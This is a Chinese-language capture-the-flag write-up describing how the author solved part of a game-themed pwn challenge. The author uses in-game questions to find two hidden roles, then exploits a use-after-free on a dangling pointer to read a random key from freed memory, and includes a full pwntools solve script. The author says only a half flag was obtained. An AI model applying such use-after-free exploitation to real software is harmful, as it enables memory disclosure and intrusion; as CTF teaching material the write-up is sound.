---
title: "血染钟楼：处决邪恶，换半面旗"
date: "2026-09-12"
categories: "Pwn"
tags: ["UAF", "信息收集", "半旗记录"]
excerpt: "通过角色问答和 UAF 读出仪式密钥，获得半旗；原文未取得可完整提交的最终 flag。"
slug: "hdctf-clocktower-half-flag"
source_event: "HDCTF"
status: "partial"
---

> 复现材料：`题目交互服务`。赛题附件未随文章打包。本文日期取自原始题解文件的修改日期。 本文仅记录获得半旗的过程，未获得可完整提交的最终 flag。运行时封印密钥样例已移除。

9 人局《染·钟楼谜团》。7 善良（4 市民 + 艺术家 + 学者 + 气球驾驶员）对 2 邪恶（间谍 + 方·古恶魔）。规则只强调一件事：先杀爪牙再杀恶魔，否则恶魔会在爪牙躯体里重生。三天内找出这两人依次处决，仪式开启后把封印密钥献上去，服务端回半面 flag。

## 找间谍：气球驾驶员第二谈

菜单 1 是夜谈记录，每天两次。第一谈随机报一个镇民，第二谈必报爪牙。全剧本只有一个爪牙，就是间谍，第二谈报的编号直接可用：

```
[气球驾驶员] 你还没见过"爪牙"类型的玩家:0号 修女艾达。
```

## 找恶魔：艺术家四次二分

艺术家有 4 次提问，答必为真。每次问「恶魔是否在某个编号集合里」，9 个候选砍半，4 次剩一个：

```python
cand = list(range(9))
for _ in range(4):
    if len(cand) == 1:
        break
    half = cand[:len(cand) // 2]
    # 回答为"是的,在其中"或"不,不在其中"
    cand = half if yes else cand[len(half):]
```

## 处决顺序

第 1 天处决间谍（菜单 3），选菜单 8 结束今天过夜，第 2 天处决恶魔。恶魔死时它的 0x30 玩家结构被 `free` 进 tcache，0x418 的仪式缓冲被 `free` 进 unsorted，仪式解锁，全局 `corpse` 变成悬垂指针，后面的 UAF 读写都走它。

## 密钥埋在尸骸偏移 0x10

密钥是开局 `getrandom` 生成的 8 字节，写在尸骸偏移 0x10。菜单 6 → 1 按偏移读：

```
[尸骸之书] <本轮动态封印密钥>
```

菜单 7 进仪式，选 1 献上封印，依次交恶魔编号和 16 位十六进制密钥，校验通过即回半旗：

```
[钟楼] 封印认可了你。(半旗)flag{Contact-cinco-on-QQ-to-get-extra-flag}
```

## 脚本

```python
#!/usr/bin/env python3
"""打通血染钟楼，拿到半面 flag。"""
from pwn import *
import re
import time

HOST, PORT = "challenge.example.invalid", 30867
context.log_level = "error"

def pat(s):
    return s.encode("utf-8")

def kick(io):
    # 服务端要先收到一个字节才输出 banner，空行得到"钟楼没有回应"后重新打印菜单
    io.sendline(b"")
    time.sleep(1.2)
    io.recv(timeout=8)

def talk_spy(io):
    # 第一谈报镇民，第二谈必报爪牙（间谍）
    io.sendline(b"1")
    io.recvuntil(b"> ")
    io.sendline(b"1")
    out = io.recvuntil(b"> ")
    m = re.search(pat('爪牙"类型的玩家:(\d+)号'), out)
    assert m, out[-200:]
    return int(m.group(1))

def find_demon(io):
    cand = list(range(9))
    for _ in range(4):
        if len(cand) == 1:
            break
        half = cand[:len(cand) // 2]
        io.sendline(b"4")
        io.recvuntil(b"> ")
        io.sendline(",".join(map(str, half)).encode())
        ans = io.recvuntil(b"> ")
        cand = half if pat("是的,在其中") in ans else cand[len(half):]
    return cand[0]

def execute(io, player):
    io.sendline(b"3")
    io.recvuntil(pat("提名谁(0-8)> "))
    io.sendline(str(player).encode())
    io.recvuntil(b"> ")

def read_key(io):
    io.sendline(b"6")
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(pat("偏移(0-0x28,8字节对齐)> "))
    io.sendline(b"16")
    out = io.recvuntil(b"> ")
    m = re.search(pat("\[尸骸之书\] ([0-9a-fA-F]{16})"), out)
    assert m, out[-200:]
    return int(m.group(1), 16)

def submit_seal(io, demon, key):
    io.sendline(b"7")
    io.recvuntil(pat("0.离开"))
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(pat("恶魔的编号(0-8)> "))
    io.sendline(str(demon).encode())
    io.recvuntil(pat("钟楼之钥(16位十六进制)> "))
    io.sendline("%016x" % key)
    out = io.recvuntil(b"> ")
    m = re.search(pat("\(半旗\)([^\n]*)"), out)
    return m.group(1).decode() if m else None

def main():
    io = remote(HOST, PORT, timeout=30)
    kick(io)
    spy = talk_spy(io)
    demon = find_demon(io)
    log.info("spy=%d demon=%d", spy, demon)
    execute(io, spy)
    io.sendline(b"8")
    io.recvuntil(b"> ")
    execute(io, demon)
    key = read_key(io)
    log.info("key=%016x", key)
    half = submit_seal(io, demon, key)
    print("half flag:", half)

if __name__ == "__main__":
    main()
```

## 半旗

```
flag{Contact-cinco-on-QQ-to-get-extra-flag}
```

半旗不是提交用 flag。题面明说剩余部分要联系 `Contact-cinco-on-QQ` 换取，直接拼 `HDCTF{}` 前缀提交会返回 incorrect。
